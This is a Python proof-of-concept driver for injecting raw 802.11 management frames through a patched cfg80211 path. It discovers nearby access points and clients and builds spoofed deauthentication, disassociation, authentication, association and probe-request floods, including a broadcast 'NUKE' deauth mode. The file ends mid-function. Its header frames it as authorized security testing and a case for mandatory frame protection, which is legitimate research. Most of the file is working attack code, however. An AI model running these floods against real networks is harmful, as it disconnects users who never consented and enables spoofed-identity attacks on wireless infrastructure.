#!/usr/bin/env python3
"""op12-mgmt-poc.py — interactive PoC driver for the OP12 cfg80211 mgmt-injection patch.

Straight-Python port of op12-mgmt-poc.sh (station mode, end-to-end). Same operator
flow, same frame bytes, same scheduler semantics — without the bash failure modes:

  * every prompt validates its input (typing NUKE at *any* prompt dispatches to
    NUKE mode instead of crashing arithmetic with "unbound variable");
  * numeric inputs re-prompt instead of flowing downstream as garbage;
  * MAC / freq / hex inputs are normalized and range-checked (mgmt >=25 B,
    tool cap <=1600 B, channel-freq sanity);
  * live rescan that finds an empty cache KEEPS the previous spoof set instead
    of clearing it and dividing by zero;
  * pacing uses time.monotonic_ns deadline scheduling (no EPOCHREALTIME string
    munging), key polling uses select() (+ tty cbreak when interactive);
  * subprocesses all have timeouts; missing iw/ip/cmd/svc degrade gracefully;
  * scan-dump parsing is a single-pass Python state machine (no awk/sed forks).

Frame bytes are identical to the bash version (same fr()/ssid_ies() layout), so all
previously documented acceptance results still apply (see wifi-modem-seams.md).

AUTHORIZED TESTING ONLY — networks/devices you own. NUKE mode is the deliberate
impact/CVSS demonstration (unauthenticated spoofed-SA broadcast deauth flood, the
case for mandatory WPA3-PMF / 802.11w); scope it to your own BSSIDs.

Needs: root (CAP_NET_ADMIN), nl80211_inject (auto-located or built from .c).
Stdlib only.
"""

import argparse
import atexit
import binascii
import fnmatch
import ipaddress
import os
import re
import select
import shutil
import subprocess
import sys
import threading
import time

try:
    import termios
    import tty
    HAVE_TERMIOS = True
except ImportError:  # pragma: no cover
    HAVE_TERMIOS = False

# --------------------------------------------------------------------------
# constants
# --------------------------------------------------------------------------
BC = "ffffffffffff"
DEFAULT_FREQ = 5745
DEFAULT_REPEAT = 5
DEFAULT_PPS = 100
MIN_PPS, MAX_PPS = 10, 1000
MIN_FRAME_LEN, MAX_FRAME_LEN = 25, 1600  # mgmt body gate / injector frame[] cap

NUKE_RE = re.compile(r"\s*[Nn][Uu][Kk][Ee]")
DIGITS_RE = re.compile(r"\d+")
RE_CHARS_RE = re.compile(r"[.^$+|(){}]")  # regex-only metachars -> ERE matcher
MAC_RE = re.compile(r"^[0-9a-f]{12}$")
HEX_RE = re.compile(r"^[0-9a-fA-F]*$")

MENU_TEXT = """\
  --- LOCKED: {mac} [{typ}] freq={freq} ({lbl}) ---
  1 * deauth  (ap: BCAST from AP | sta: AP->target)
  2 * deauth directed (ap: AP->client prompt | sta: target->AP)
  3 * disassoc (ap: BCAST from AP | sta: AP->target)
  4 * disassoc directed
  5 # probe-req flood (target SSID)
  6 * auth flood (join attempt)
  7 * assoc-req flood (join attempt)
  8   public    action cat=04 -> target
  9   vendor    action cat=7f (OP12POC tag) -> target
  10  non-public action cat=00 -> target
  11  beacon spoof (ap) / probe-resp spoof (station)
  12  custom hex frame
  13 * scheduled burst via scheduler: '13 <attack#> <frames> [pps]'  (shorthand '<a#>s <frames> [pps]')
   ---
   A   safe demo set (5,8,9,10 — one shot each)
   V   verify end-to-end state
   I   capability info
   R   re-lock target (rescan)
   Q   quit"""

INFO_TEXT = """\
  Patch capabilities (verified 2026-10-07, wifi-modem-seams.md):
   - every mgmt subtype accepted (frame >=25B); data/null/QoS = EINVAL (mgmt-only path)
   - SA/DA/BSSID fully arbitrary: own / peer / broadcast / zero all pass cfg80211
   - any action category; off-channel + 6GHz accepted (implicit ROC; OFFCHAN flag optional)
   - FRAME_TX_STATUS ACK flag = firmware completion, NOT a literal 802.11 ACK
     (only unicast-to-AP completions carry real ACK meaning)
   - auth subtype: accepted but silent (no TXSTATUS) — on-air status unknown
   - tool frame cap 1600B; needs CAP_NET_ADMIN; associated nl80211 scan = EPERM (qcacld)"""


# --------------------------------------------------------------------------
# control-flow exceptions (NUKE works at *any* prompt; EOF exits cleanly)
# --------------------------------------------------------------------------
class NukeRequest(Exception):
    def __init__(self, budget=0):
        super().__init__("nuke")
        self.budget = budget


class EOFExit(Exception):
    pass


def maybe_nuke(s):
    """NUKE[<n>] prefix anywhere -> dispatch (mirrors the old arm-gate regex)."""
    if NUKE_RE.match(s or ""):
        m = DIGITS_RE.search(s)
        raise NukeRequest(int(m.group(0)) if m else 0)


def inp(prompt):
    """Read one line; NUKE input raises NukeRequest, EOF raises EOFExit."""
    try:
        sys.stdout.write(prompt)
        sys.stdout.flush()
    except (BrokenPipeError, ValueError):
        raise EOFExit()
    try:
        line = sys.stdin.readline()
    except KeyboardInterrupt:
        raise
    if line == "":
        raise EOFExit()
    line = line.rstrip("\n").rstrip("\r")
    maybe_nuke(line)
    return line


# --------------------------------------------------------------------------
# config
# --------------------------------------------------------------------------
class Config:
    def __init__(self, args):
        self.iface = args.iface or os.environ.get("IFACE", "wlan0")
        self.repeat = _env_int("REPEAT", args.repeat or 0) or DEFAULT_REPEAT
        self.scope = (args.scope or os.environ.get("NUKE_SCOPE", "all")).strip()
        self.pps = _env_int("NUKE_PPS", args.pps or 0) or DEFAULT_PPS
        self.dry = bool(args.dry) or os.environ.get("SCHED_DRY", "") == "1"
        self.fire_delay = _env_float("FIRE_DELAY", 0.0) or 0.2
        self.tool_override = args.tool
        self.fixture = args.fixture or os.environ.get("BSS_FIXTURE", "")
        self.no_daemon = bool(args.no_daemon)
        self.tool = ""


def _env_int(name, cli_val):
    if cli_val:
        try:
            return int(cli_val)
        except (TypeError, ValueError):
            return 0
    try:
        return int(os.environ.get(name, "") or 0)
    except ValueError:
        return 0


def _env_float(name, default):
    try:
        return float(os.environ.get(name, "") or default)
    except ValueError:
        return default


def parse_args(argv=None):
    p = argparse.ArgumentParser(
        description="OP12 cfg80211 mgmt-injection PoC (authorized testing only).")
    p.add_argument("--iface", default=None)
    p.add_argument("--repeat", type=int, default=None)
    p.add_argument("--scope", default=None,
                   help="NUKE spoof scope: all|own|<mac> (or NUKE_SCOPE env)")
    p.add_argument("--pps", type=int, default=None,
                   help="initial target pps (or NUKE_PPS env)")
    p.add_argument("--dry", action="store_true",
                   help="SCHED_DRY: count frames without transmitting (zero RF)")
    p.add_argument("--tool", default=None, help="explicit nl80211_inject path")
    p.add_argument("--fixture", default=None,
                   help="file with saved `iw scan dump` text (tests/demos)")
    p.add_argument("--self-test", action="store_true",
                   help="run built-in smoke tests (no hardware needed) and exit")
    p.add_argument("--no-daemon", action="store_true",
                   help="fork nl80211_inject per frame (default: persistent --stdio socket)")
    p.add_argument("--doctor", action="store_true",
                   help="check wifi driver/tool state (non-disruptive) and exit")
    p.add_argument("--doctor-disruptive", action="store_true",
                   help="doctor + one unicast self-deauth proof (brief ~1s blip of own link)")
    return p.parse_args(argv)


# --------------------------------------------------------------------------
# small utils
# --------------------------------------------------------------------------
def run(cmd, timeout=15):
    """Run cmd, return stdout (str). Any failure -> '' (degrade gracefully)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout or ""
    except Exception:
        return ""


def norm_mac(s):
    """aa:bb:.. / aabb.. / dashes -> 12 lowercase hex chars, or '' if invalid."""
    if not s:
        return ""
    m = re.sub(r"[^0-9a-fA-F]", "", s).lower()
    return m if MAC_RE.match(m) else ""


def colon_mac(m):
    return ":".join(m[i:i + 2] for i in range(0, 12, 2))


def valid_freq(f):
    try:
        return int(f) > 0
    except (TypeError, ValueError):
        return False


# --------------------------------------------------------------------------
# frame builders (byte-identical to the bash fr()/ssid_ies())
# --------------------------------------------------------------------------
def fr(fc, da, sa, bssid, body):
    return "%s0000%s%s%s0000%s" % (fc, da, sa, bssid, body)


def ssid_ies(ssid):
    b = (ssid or "").encode("utf-8", "replace")
    return "00%02x%s010882848b960c121824" % (len(b), binascii.hexlify(b).decode())


# --------------------------------------------------------------------------
# injector
# --------------------------------------------------------------------------
class Injector:
    def __init__(self, path, no_daemon=False):
        self.path = path
        self.no_daemon = no_daemon
        self.daemons = {}  # iface -> DaemonInjector (persistent --stdio socket)

    def send(self, iface, freq, hexframe, fast=False):
        """Transmit one frame. Prefers the daemon; falls back to one-shot. Never raises."""
        if not self.no_daemon:
            d = self.daemons.get(iface)
            if d is None:
                d = DaemonInjector(self.path, iface)
                self.daemons[iface] = d
            try:
                return d.send(freq, hexframe, fast)
            except Exception:
                try:
                    d.close()
                except Exception:
                    pass
                self.daemons.pop(iface, None)
        return self.oneshot(iface, freq, hexframe, fast)

    def oneshot(self, iface, freq, hexframe, fast=False):
        cmd = [self.path]
        if fast:
            cmd.append("--fast")
        cmd += [iface, str(freq), hexframe]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            out = (r.stdout or "") + (r.stderr or "")
        except Exception:
            return False, False
        accepted = ("accepted for TX" in out) or ("ACK (accepted)" in out)
        ack = "ACK=yes" in out
        return accepted, ack

    def close(self):
        for d in list(self.daemons.values()):
            try:
                d.close()
            except Exception:
                pass
        self.daemons.clear()


class DaemonInjector:
    """One --stdio child per iface: socket/family/membership set up once, then
    one frame per stdin line. Restarts transparently on death; raises on
    transport failure so the caller can fall back to one-shot."""

    def __init__(self, path, iface, wait=2):
        self.path = path
        self.iface = iface
        self.wait = wait
        self.lock = threading.Lock()
        self.proc = None
        self._start()

    def _start(self):
        self._stop()
        try:
            self.proc = subprocess.Popen(
                [self.path, "--stdio", "--wait", str(self.wait), self.iface],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL, text=True, bufsize=1)
        except Exception:
            self.proc = None

    def _stop(self):
        p, self.proc = self.proc, None
        if p is None:
            return
        try:
            if p.stdin:
                p.stdin.close()
        except Exception:
            pass
        try:
            p.wait(timeout=2)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass

    def alive(self):
        return self.proc is not None and self.proc.poll() is None

    def send(self, freq, hexframe, fast=False):
        with self.lock:
            if not self.alive():
                self._start()
            if not self.alive():
                raise RuntimeError("injector daemon unavailable")
            try:
                self.proc.stdin.write("%s %s %s\n"
                                      % ("fast" if fast else "full",
                                         freq, hexframe or ""))
                self.proc.stdin.flush()
            except Exception as e:
                raise RuntimeError("daemon write failed: %s" % e)
            try:
                fd = self.proc.stdout.fileno()
                r, _, _ = select.select([fd], [], [], self.wait + 8)
            except Exception as e:
                raise RuntimeError("daemon poll failed: %s" % e)
            if not r:
                raise RuntimeError("daemon reply timeout")
            try:
                line = self.proc.stdout.readline()
            except Exception as e:
                raise RuntimeError("daemon read failed: %s" % e)
            if not line:
                raise RuntimeError("daemon EOF")
            line = line.strip()
            if line.startswith("OK"):
                return True, ("ack=yes" in line)
            return False, False

    def close(self):
        with self.lock:
            self._stop()


def locate_tool(override=""):
    if override:
        if os.path.isfile(override) and os.access(override, os.X_OK):
            return override
        print("FATAL: --tool %s not found/executable" % override)
        sys.exit(1)
    here = os.path.dirname(os.path.abspath(__file__))
    for c in (os.path.join(here, "nl80211_inject"),
              "/tmp/opencode/nl80211_inject",
              "/data/local/tmp/nl80211_inject"):
        if os.path.isfile(c) and os.access(c, os.X_OK) and _probe(c):
            return c
    src = ""
    for s in (os.path.join(here, "nl80211_inject.c"),
              "/tmp/opencode/nl80211_inject.c"):
        if os.path.isfile(s):
            src = s
            break
    cc = shutil.which("cc") or shutil.which("gcc")
    if src and cc:
        out = "/tmp/opencode/nl80211_inject"
        try:
            os.makedirs(os.path.dirname(out), exist_ok=True)
        except Exception:
            import tempfile
            out = os.path.join(tempfile.mkdtemp(prefix="op12poc"), "nl80211_inject")
        r = subprocess.run([cc, "-O2", src, "-o", out],
                           capture_output=True, text=True, timeout=120)
        if r.returncode == 0 and _probe(out):
            try:
                os.chmod(out, 0o755)
            except Exception:
                pass
            return out
        print("FATAL: cannot build injector from %s" % src)
        sys.exit(1)
    print("FATAL: nl80211_inject not found and no source+compiler available")
    sys.exit(1)


def _probe(path):
    try:
        r = subprocess.run([path, "__no_such_iface__", "5745"],
                           capture_output=True, text=True, timeout=10)
        return "no such iface" in ((r.stdout or "") + (r.stderr or ""))
    except Exception:
        return False


def ensure_root(cfg, argv):
    if os.geteuid() == 0:
        return
    if shutil.which("sudo") and subprocess.run(
            ["sudo", "-n", "true"], capture_output=True, timeout=10).returncode == 0:
        env = [f"NUKE_SCOPE={cfg.scope}", f"NUKE_PPS={cfg.pps}",
               f"SCHED_DRY={1 if cfg.dry else 0}", f"REPEAT={cfg.repeat}",
               f"IFACE={cfg.iface}"]
        if cfg.fixture:
            env.append(f"BSS_FIXTURE={cfg.fixture}")
        script = os.path.abspath(__file__)
        os.execvp("sudo", ["sudo", "env"] + env +
                  [sys.executable or "python3", script] + argv)
    print("FATAL: need root (CAP_NET_ADMIN)")
    sys.exit(1)


# --------------------------------------------------------------------------
# targets
# --------------------------------------------------------------------------
class Target:
    __slots__ = ("mac", "typ", "freq", "label", "ssid")

    def __init__(self, mac, typ, freq, label, ssid=""):
        self.mac = mac
        self.typ = typ
        self.freq = freq
        self.label = label
        self.ssid = ssid or ""

    def __repr__(self):
        return "Target(%s,%s,%s)" % (self.mac, self.typ, self.freq)


class State:
    def __init__(self, cfg, injector):
        self.cfg = cfg
        self.inj = injector
        self.targets = []          # detected APs/stations
        self.spoof = []            # scheduled-burst spoof set (Target list)
        self.own = ""
        self.ap_bssid = ""
        self.freq = ""
        self.ssid = ""
        self.assoc = False
        self.fake = "0a" + "".join("%02x" % b for b in os.urandom(5))
        # locked single target
        self.lock_mac = ""
        self.lock_type = ""
        self.lock_freq = 0
        self.lock_lbl = ""
        self.lock_ssid = ""
        self.self_kick = False
        self.ap_ctx = ""
        # scheduler per-run context
        self.sched_mode = 1
        self.sched_cli = ""
        self.sched_hex = ""
        self.sched_scope = ""


# -- own link state ---------------------------------------------------------
def own_state(st):
    try:
        with open("/sys/class/net/%s/address" % st.cfg.iface) as f:
            st.own = norm_mac(f.read().strip())
    except Exception:
        st.own = ""
    link = run(["iw", "dev", st.cfg.iface, "link"])
    m = re.search(r"Connected to ([0-9a-fA-F:]+)", link)
    st.ap_bssid = norm_mac(m.group(1)) if m else ""
    m = re.search(r"freq:\s*(\d+)", link)
    st.freq = m.group(1) if m else ""
    m = re.search(r"SSID:\s*(.*)", link)
    st.ssid = m.group(1).strip() if m else ""
    st.assoc = bool(st.ap_bssid)


def linkstate(st):
    if st.assoc:
        print("  [state] %s associated bssid=%s freq=%s"
              % (st.cfg.iface, st.ap_bssid, st.freq))
    else:
        print("  [state] %s UNassociated (station mode) — off-channel TX per target freq"
              % st.cfg.iface)


def add_tgt(lst, own, mac, typ, freq, label, ssid=""):
    m = norm_mac(mac)
    if not m or m == own:
        return False
    for t in lst:
        if t.mac == m:
            return False
    try:
        f = int(freq or 0)
    except (TypeError, ValueError):
        f = 0
    lst.append(Target(m, typ, f, label, ssid))
    return True


# -- scan-dump parsing (single-pass state machine; replaces the awk pipe) ----
def parse_bss_dump(text):
    """Parse `iw scan dump` text -> list of (mac, freq, sig, ssid)."""
    recs = []
    mac, freq, sig, ssid = "", "", "", ""
    bss_re = re.compile(r"^BSS\s+([0-9a-fA-F:]+)")

    def emit():
        if mac:
            recs.append((mac, freq, sig, ssid))

    for line in (text or "").splitlines():
        m = bss_re.match(line)
        if m:
            emit()
            mac = m.group(1)
            paren = mac.find("(")
            if paren >= 0:
                mac = mac[:paren]
            freq, sig, ssid = "", "", ""
            continue
        s = line.strip()
        if s.startswith("freq:"):
            parts = s.split()
            if len(parts) >= 2:
                freq = parts[1].removesuffix(".0") if hasattr(str, "removesuffix") \
                    else (parts[1][:-2] if parts[1].endswith(".0") else parts[1])
        elif s.startswith("signal:"):
            parts = s.split()
            if len(parts) >= 2:
                sig = parts[1]
        elif s.startswith("SSID:"):
            ssid = s[5:].strip()
    emit()
    return recs


def parse_cmd_wifi(text):
    """Shape `cmd wifi list-scan-results` rows into parse_bss_dump() input."""
    out = []
    for line in (text or "").splitlines():
        parts = line.split()
        if len(parts) >= 3:
            out.append("BSS %s freq: %s" % (parts[0], parts[1]))
            out.append("\tSSID: %s" % line[line.index(parts[2]):])
    return "\n".join(out)


# -- detection ----------------------------------------------------------------
def detect(st, quiet=False):
    st.targets = []
    own_state(st)

    # 1) associated peers on other vdevs (true stations; SAP/P2P-GO case)
    devs = re.findall(r"Interface\s+(\S+)",
                      run(["iw", "dev"], timeout=10))
    for dev in devs:
        if dev == st.cfg.iface:
            continue
        dump = run(["iw", "dev", dev, "station", "dump"], timeout=10)
        mac, sig = "", "?"
        for line in dump.splitlines():
            line = line.strip()
            if line.startswith("Station "):
                if mac:
                    add_tgt(st.targets, st.own, mac, "station",
                            st.freq or 0, "peer-on-%s sig=%s" % (dev, sig))
                parts = line.split()
                mac = parts[1] if len(parts) > 1 else ""
                sig = "?"
            elif line.startswith("signal:"):
                parts = line.split()
                if len(parts) >= 2:
                    sig = parts[1]
        if mac:
            add_tgt(st.targets, st.own, mac, "station",
                    st.freq or 0, "peer-on-%s sig=%s" % (dev, sig))

    # 2) L2 neighbors (only meaningful while associated: we have an IP)
    if st.assoc:
        addr_out = run(["ip", "-o", "-4", "addr", "show", st.cfg.iface], timeout=10)
        m = re.search(r"inet\s+(\S+)", addr_out)
        if m:
            cidr = m.group(1)
            try:
                bc = str(ipaddress.ip_interface(cidr).network.broadcast_address)
            except ValueError:
                bc = ""
            if bc and shutil.which("arping"):
                subprocess.run(["arping", "-c", "2", "-w", "2",
                                "-I", st.cfg.iface, "-b", bc],
                               capture_output=True, timeout=10)
            for line in run(["ip", "-4", "neigh", "show", "dev", st.cfg.iface],
                            timeout=10).splitlines():
                toks = line.split()
                if "lladdr" not in toks:
                    continue
                mac = toks[toks.index("lladdr") + 1] if toks.index("lladdr") + 1 < len(toks) else ""
                if not mac:
                    continue
                ip = toks[0] if toks else "?"
                lbl = "neighbor %s" % ip
                if ip == cidr.split("/")[0]:
                    lbl = "neighbor %s (gateway)" % ip
                add_tgt(st.targets, st.own, mac, "station",
                        st.freq or 0, "%s [%s]" % (lbl, toks[-1] if toks else "?"))

    # 3) AP scan
    if not st.assoc:
        if not quiet:
            print("  scanning (unassociated station mode)...")
        run(["iw", "dev", st.cfg.iface, "scan"], timeout=30)
    else:
        dump = run(["iw", "dev", st.cfg.iface, "scan", "dump"], timeout=30)
        cached = dump.count("\nBSS ") + (1 if dump.startswith("BSS ") else 0)
        if cached <= 1:
            print("  note: associated — nl80211 scan denied (EPERM); cache is minimal.")
        print("  hint: disable Wi-Fi (or menu D) for a fresh full scan, then reselect.")
    dump = run(["iw", "dev", st.cfg.iface, "scan", "dump"], timeout=30)
    for (mac, freq, sig, ssid) in parse_bss_dump(dump):
        try:
            f = int(freq or 0)
        except ValueError:
            f = 0
        add_tgt(st.targets, st.own, mac, "ap", f,
                'AP "%s" %sdBm' % (ssid or "<hidden>", sig or "?"), ssid)

    # 3b) Android framework results, if a real Android shell is present
    if shutil.which("cmd"):
        shaped = parse_cmd_wifi(run(["cmd", "wifi", "list-scan-results"], timeout=15))
        for (mac, freq, sig, ssid) in parse_bss_dump(shaped):
            try:
                f = int(freq or 0)
            except ValueError:
                f = 0
            add_tgt(st.targets, st.own, mac, "ap", f,
                    'AP "%s" %sdBm' % (ssid or "<hidden>", sig or "?"), ssid)

    # 3c) recorded fixture (tests / demos without a radio)
    if st.cfg.fixture:
        try:
            with open(st.cfg.fixture, errors="replace") as f:
                text = f.read()
        except OSError as e:
            print("  ? fixture unreadable: %s" % e)
            text = ""
        for (mac, freq, sig, ssid) in parse_bss_dump(text):
            try:
                f = int(freq or 0)
            except ValueError:
                f = 0
            add_tgt(st.targets, st.own, mac, "ap", f,
                    'AP "%s" %sdBm' % (ssid or "<hidden>", sig or "?"), ssid)
    return st.targets


def print_targets(st):
    print()
    print("=========== DETECTED TARGETS ===========")
    for i, t in enumerate(st.targets):
        print("  %2d) [%-7s] %s  freq=%-6s %s"
              % (i + 1, t.typ, t.mac, t.freq, t.label))
    print("  %2d) [manual ] enter MAC yourself" % (len(st.targets) + 1))
    print("========================================")


def lock_target(st, idx1):
    t = st.targets[idx1 - 1]
    st.lock_mac, st.lock_type = t.mac, t.typ
    st.lock_freq = t.freq
    st.lock_lbl, st.lock_ssid = t.label, t.ssid
    if not st.lock_freq:
        st.lock_freq = int(st.freq) if str(st.freq).isdigit() else 0
        while not st.lock_freq:
            ans = inp("  target freq unknown — enter MHz: ")
            if ans.isdigit() and int(ans) > 0:
                st.lock_freq = int(ans)
            else:
                print("  ? freq must be a positive number (MHz)")
    st.self_kick = (st.lock_type == "ap" and st.lock_mac == st.ap_bssid)
    st.ap_ctx = st.lock_mac if st.lock_type == "ap" else (st.ap_bssid or "")
    print()
    print("  ######## TARGET LOCKED ########")
    print("  mac=%s type=%s freq=%s" % (st.lock_mac, st.lock_type, st.lock_freq))
    print("  (%s)  fake-client=%s" % (st.lock_lbl, st.fake))
    if st.self_kick:
        print("  ** THIS IS OUR AP — kick attacks disconnect this device (~1s blip) **")
    print("  ###############################")


def sort_spoof_set(spoof):
    spoof.sort(key=lambda t: (t.freq, t.mac))


def lock_select(st, indices):
    """1-based indices -> spoof set + lock first. Returns True on success."""
    seen = set()
    first = 0
    new = []
    for x in indices:
        try:
            xi = int(x)
        except (TypeError, ValueError):
            continue
        if xi < 1 or xi > len(st.targets) or xi in seen:
            continue
        seen.add(xi)
        if not first:
            first = xi
        t = st.targets[xi - 1]
        f = t.freq or (int(st.freq) if str(st.freq).isdigit() else DEFAULT_FREQ)
        new.append(Target(t.mac, t.typ, f, t.label, t.ssid))
    if not new:
        print("  ? nothing valid selected")
        return False
    sort_spoof_set(new)
    st.spoof = new
    lock_target(st, first)
    print("  [multi] scheduled burst set: %d target(s) -> %s"
          % (len(st.spoof), " ".join(t.mac for t in st.spoof)))
    return True


# -- SSID matcher: glob by default, ERE when regex-only metachars (or ~) ------
def split_pattern(sel):
    pat = sel[1:]
    force_re = False
    if pat.startswith("~"):
        force_re, pat = True, pat[1:]
    elif RE_CHARS_RE.search(pat):
        force_re = True
    return pat, force_re


def match_ssids(targets, pat, force_re):
    hits = []
    if force_re:
        try:
            rx = re.compile(pat)
        except re.error as e:
            print("  ? invalid regex '%s': %s" % (pat, e))
            return []
        for i, t in enumerate(targets):
            if t.ssid and rx.search(t.ssid):
                hits.append(i + 1)
    else:
        for i, t in enumerate(targets):
            if t.ssid and fnmatch.fnmatchcase(t.ssid, pat):
                hits.append(i + 1)
    return hits


def read_lock(st):
    detect(st)
    print_targets(st)
    while True:
        try:
            sel = inp("Select target [1-%d, comma=multi, S<pattern>=SSID match, "
                      "M=manual, R=rescan, D=disconnect-hint]: " % (len(st.targets) + 1))
        except EOFExit:
            print("bye.")
            sys.exit(0)
        if sel in ("R", "r"):
            detect(st)
            print_targets(st)
        elif sel in ("D", "d"):
            print("  Full scan needs Wi-Fi DISABLED while associated "
                  "(nl80211 scan = EPERM here).")
            print("  If on a real Android shell: 'svc wifi disable' ... "
                  "reenable with 'svc wifi enable'.")
            print("  WARNING: disabling Wi-Fi drops any session riding wlan0 "
                  "(incl. this tool's own link).")
            if shutil.which("svc"):
                try:
                    yn = inp("  run svc wifi disable now? [y/N]: ")
                except EOFExit:
                    continue
                if yn != "y":
                    continue
                subprocess.run(["svc", "wifi", "disable"],
                               capture_output=True, timeout=15)
                import time as _t
                _t.sleep(3)
                detect(st)
                print_targets(st)
        elif sel in ("M", "m"):
            manual_entry(st)
            return
        elif sel[:1] in ("S", "s"):
            pat, force_re = split_pattern(sel)
            if not pat:
                print("  ? usage: S<pattern>  glob SSID match, e.g. SThe Mill* / Stest_ap_* ;")
                print("    or S<regex> if it contains regex metachars, e.g. S^test_ap_ "
                      "(SD?_vendor); S~<regex> forces ERE.")
                continue
            hits = match_ssids(st.targets, pat, force_re)
            if not hits:
                print("  ? no detected target SSIDs match '%s'" % pat)
            else:
                print("  [match] %d target(s) match '%s' -> ids: %s"
                      % (len(hits), pat, " ".join(map(str, hits))))
                if lock_select(st, hits):
                    return
        else:
            toks = re.split(r"[\s,]+", sel.strip())
            toks = [t for t in toks if t]
            if not toks:
                print("  ? invalid choice")
                continue
            if (len(toks) == 1 and toks[0].isdigit()
                    and int(toks[0]) == len(st.targets) + 1):
                manual_entry(st)
                return
            if all(t.isdigit() and 1 <= int(t) <= len(st.targets) for t in toks):
                if lock_select(st, [int(t) for t in toks]):
                    return
            else:
                print("  ? invalid selection (use 1-%d, comma-separated for multiple)"
                      % len(st.targets))


def manual_entry(st):
    while True:
        try:
            mac = inp("  MAC (aa:bb:cc:dd:ee:ff): ")
        except EOFExit:
            return
        if norm_mac(mac):
            break
        print("  ? not a valid MAC (need 12 hex digits)")
    try:
        freq_s = inp("  freq MHz [%s]: " % (st.freq or DEFAULT_FREQ))
    except EOFExit:
        return
    freq = (int(freq_s) if freq_s.isdigit() and int(freq_s) > 0
            else (int(st.freq) if str(st.freq).isdigit() else DEFAULT_FREQ))
    try:
        lbl = inp("  label: ")
        ssid = inp("  SSID (for beacon/probe-resp spoof, blank=none): ")
    except EOFExit:
        return
    st.targets.append(Target(norm_mac(mac), "ap", freq, lbl or "manual", ssid))
    lock_select(st, [len(st.targets)])


# --------------------------------------------------------------------------
# transmit: single-shot fire()
# --------------------------------------------------------------------------
def fire(st, label, hexframe, count, freq=None):
    if not isinstance(count, int) or count <= 0:
        print("  ? frame count must be a positive number (got '%s')" % (count,))
        return (0, count if isinstance(count, int) else 0)
    f = freq or st.lock_freq
    print("  -> %-48s x%-3s freq=%s" % (label, count, f))
    ok = ack = 0
    for _ in range(count):
        if st.cfg.dry:
            ok += 1
            continue
        a, k = st.inj.send(st.cfg.iface, f, hexframe)
        ok += 1 if a else 0
        ack += 1 if k else 0
        if st.cfg.fire_delay > 0:
            try:
                import time as _t
                _t.sleep(st.cfg.fire_delay)
            except Exception:
                pass
    if ok == 0:
        print("     REJECTED 0/%s" % count)
    else:
        print("     accepted %s/%s   fw-completion(ACK=yes) %s/%s" % (ok, count, ack, count))
    linkstate(st)
    return ok, count


def ask_frames(st, default=None):
    d = default or st.cfg.repeat
    while True:
        try:
            r = inp("  frames [default %s]: " % d)
        except EOFExit:
            return d
        if not r.strip():
            return d
        if r.strip().isdigit() and int(r.strip()) > 0:
            return int(r.strip())
        print("  ? frames must be a positive number")


def ask_client(st, default=""):
    d = default or st.fake
    while True:
        try:
            c = inp("  client MAC to hit [%s]: " % d)
        except EOFExit:
            return d
        c = c or d
        if norm_mac(c):
            return norm_mac(c)
        print("  ? not a valid MAC (need 12 hex digits)")


def ask_hex(prompt="  hex frame: "):
    while True:
        try:
            h = inp(prompt)
        except EOFExit:
            return ""
        h = re.sub(r"[\s:]", "", h).lower()
        if not h or not HEX_RE.match(h) or len(h) % 2:
            print("  ? hex frame must be even-length hex")
            continue
        try:
            nbytes = len(binascii.unhexlify(h))
        except binascii.Error:
            print("  ? hex frame must be even-length hex")
            continue
        if nbytes < MIN_FRAME_LEN:
            print("  ? frame too short: %d B (mgmt needs >=%d B with body)"
                  % (nbytes, MIN_FRAME_LEN))
            continue
        if nbytes > MAX_FRAME_LEN:
            print("  ? frame too long: %d B (tool cap %d B)" % (nbytes, MAX_FRAME_LEN))
            continue
        return h


# --------------------------------------------------------------------------
# attacks — one builder shared by single-shot menu and the scheduler
# --------------------------------------------------------------------------
class Ctx:
    def __init__(self, ap_ctx="", assoc_ssid="", fake="", cli="", custom_hex=""):
        self.ap_ctx = ap_ctx
        self.assoc_ssid = assoc_ssid
        self.fake = fake
        self.cli = cli
        self.custom_hex = custom_hex


def eff_ssid(tgt_ssid, assoc_ssid):
    return tgt_ssid or assoc_ssid or ""


def build_frame(mode, tgt, ctx):
    """Return (label, hexframe) for attack mode 1..12 against tgt (Target)."""
    m, t = tgt.mac, tgt.typ
    ap = ctx.ap_ctx or BC
    if mode == 1:
        if t == "ap":
            return ("deauth BCAST from AP (SA=%s DA=bcast)" % m,
                    fr("c000", BC, m, m, "0700"))
        return ("deauth AP->STA (SA=%s DA=%s)" % (ap, m),
                fr("c000", m, ap, ap, "0700"))
    if mode == 2:
        cli = ctx.cli or ctx.fake
        if t == "ap":
            return ("deauth AP->client %s (SA=%s)" % (cli, m),
                    fr("c000", cli, m, m, "0700"))
        return ("deauth STA->AP (SA=%s DA=%s)" % (m, ap),
                fr("c000", ap, m, ap, "0700"))
    if mode == 3:
        if t == "ap":
            return ("disassoc BCAST from AP (SA=%s)" % m,
                    fr("a000", BC, m, m, "0800"))
        return ("disassoc AP->STA (SA=%s DA=%s)" % (ap, m),
                fr("a000", m, ap, ap, "0800"))
    if mode == 4:
        cli = ctx.cli or ctx.fake
        if t == "ap":
            return ("disassoc AP->client %s (SA=%s)" % (cli, m),
                    fr("a000", cli, m, m, "0800"))
        return ("disassoc STA->AP (SA=%s DA=%s)" % (m, ap),
                fr("a000", ap, m, ap, "0800"))
    if mode == 5:
        s = eff_ssid(tgt.ssid, ctx.assoc_ssid)
        sa = ctx.fake if t == "ap" else m
        return ('probe-req flood SSID="%s" (SA=%s)' % (s, sa),
                fr("4000", BC, sa, BC, ssid_ies(s)))
    if mode == 6:
        sa, da = (ctx.fake, m) if t == "ap" else (m, ap)
        return ("auth flood as %s -> %s" % (sa, da),
                fr("b000", da, sa, da, "000000010000"))
    if mode == 7:
        s = eff_ssid(tgt.ssid, ctx.assoc_ssid)
        sa, da = (ctx.fake, m) if t == "ap" else (m, ap)
        return ('assoc-req flood as %s -> %s SSID="%s"' % (sa, da, s),
                fr("0000", da, sa, da, "04010a00" + ssid_ies(s)))
    if mode == 8:
        return (("public action cat=04 -> %s" % m),
                fr("d000", m, m, m, "0409deadbeef4f503132504f43"))
    if mode == 9:
        return (("vendor action cat=7f OP12POC -> %s" % m),
                fr("d000", m, m, m, "7fdeadbeef4f503132504f43"))
    if mode == 10:
        return (("non-public action cat=00 -> %s" % m),
                fr("d000", m, m, m, "0000000000"))
    if mode == 11:
